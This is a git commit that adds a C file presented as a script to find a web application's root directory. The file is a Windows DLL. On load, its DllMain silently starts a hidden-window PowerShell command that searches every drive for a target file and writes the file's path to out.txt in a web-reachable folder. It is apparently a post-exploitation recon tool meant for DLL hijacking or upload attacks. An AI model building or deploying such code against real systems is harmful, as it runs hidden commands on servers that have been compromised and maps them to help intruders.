bea1344e46ab090b5e544d0cd102319091a29b84
Ian <61641716+huntr-huntr@users.noreply.github.com>
2021-01-28 01:47:32 +0800

    new lib directory

---
+++ lib/find-webroot.c
@@ -0,0 +1,16 @@
+/* 
+ * Straight to the point script to find the web application root directory 
+ * E.g. target --> /content/img/20210128/arrow.jpg
+ * Output will be /content/img/20210128/out.txt
+ * Out.txt contains the full path of arrow.jpg
+ */
+
+#include <windows.h>
+#include <stdio.h>
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    if (fdwReason == DLL_PROCESS_ATTACH)
+        system("powershell -nop -w 1 \"(Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object { $pp=(Get-ChildItem -Path $_ -Filter FILE_TO_SEARCH -Recurse -ErrorAction SilentlyContinue -Force).DirectoryName }; Out-File -FilePath $pp\\out.txt -InputObject $pp -Encoding ASCII -Force -ErrorAction SilentlyContinue\"");
+    return TRUE;
+}
